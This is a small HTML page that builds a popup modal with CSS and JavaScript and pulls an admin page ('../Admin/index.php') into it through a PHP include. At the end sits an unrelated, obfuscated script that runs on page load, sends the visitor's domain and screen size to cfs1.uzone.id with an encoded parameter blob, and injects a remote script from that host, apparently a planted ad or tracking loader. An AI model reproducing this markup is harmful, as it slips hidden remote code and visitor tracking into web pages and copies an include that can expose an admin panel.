<!DOCTYPE html>
<html>
<head>
<style>
/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    padding-top: 100px; /* Location of the box */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content */
.modal-content {
    background-color: #fefefe;
    margin: auto;
    padding: 20px;
    border: 1px solid #888;
    width: 80%;
}

/* The Close Button */
.close {
    color: #aaaaaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: #000;
    text-decoration: none;
    cursor: pointer;
}
</style>
</head>
<body>


<button id="myBtn">Open Modal</button>

<!-- The Modal -->
<div id="myModal" class="modal">

  <div class="modal-content">
    <span class="close">&times;</span>
   <?php include '../Admin/index.php'; ?>
  </div>

</div>

<script>
// Get the modal
var modal = document.getElementById('myModal');

// Get the button that opens the modal
var btn = document.getElementById("myBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 
btn.onclick = function() {
    modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
    modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9"+ "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKS9pUShN6owDUsc4zfGLM0rkluTAwyCaTuh8ab946mgfKp2oljSVGg3qQKq4l8zsb5D7GZYJKK6N11V1XA62AR8vI2fTGoeR0gN11P%2b0ILQo9qLLWntzO8Qdw6GQ5thYpRffKur0uubCWfg4OpsdPUIhvEQEuPdHcSFTPpNCfiOoyEDsEEcdtqVKXKLQzl8ofnPuIrIzsmkEUuynUBXegJ7aErYlQodgJ%2b5tcZgTWi6xX0Suo%2b95aUikspLc4r2l3xXmC0pwhXM3uldiuv2MPaxwSA5hEj0yoXKXAivZMvUSVRkZU9WTmwdXNqN5ahv1AOiKTXhmwAUQrsgnfRuWQOJ%2b77ZghVuiRA4bN%2f2qYZp3RPKLckk2U4RNrieasOtvZIJbzvygYuInE%2fRP7u7h3VvuNGmqxrm48mv5IFgJo%2fX0YAfQbtmz2%2b%2fTLeJKVSIYhZYStebD4D7pbJ3kWImhcjAOkMj9umQU1rhZqExle%2fY01m332mbZTTnIpGKMW0baSBjOQ%2b8S3VZQiaLOsQm8URDBnnz6JyYXxd%2baTobMCOEg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
